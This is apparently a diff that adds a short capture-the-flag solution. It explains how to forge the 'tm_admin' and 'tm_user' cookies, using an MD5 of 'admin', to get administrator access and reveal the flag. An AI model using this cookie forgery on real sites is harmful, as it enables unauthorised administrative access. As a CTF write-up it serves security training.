@@ -1,0 +1,6 @@
+Modify `tm_admin` cookie from 0 to 1 and `tm_user` cookie from md5('anonymous') to md5 ('admin') to view the flag.
+
+```
+	tm_user = 21232f297a57a5a743894a0e4a801fc3
+	tm_admin = 1
+```
